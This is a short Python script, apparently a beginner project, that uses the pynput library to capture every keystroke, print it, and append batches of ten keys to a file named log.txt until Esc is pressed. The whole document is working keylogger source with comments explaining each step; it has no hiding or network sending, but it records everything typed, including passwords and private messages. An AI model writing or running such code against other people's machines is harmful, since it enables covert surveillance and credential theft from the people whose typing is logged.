

import pynput #imported libraries
from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):  #When someone presses it begins to listen. 
    global keys, count
    
    keys.append(key)
    count+= 1
    print("{0} pressed".format(key))
    
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []
        
        
def write_file(keys):  #Takes what is being listened to as puts it into a log. 
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(str(key))
        
          
def on_release(key): # When board isn't being touched it won't listen/log.
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()   
    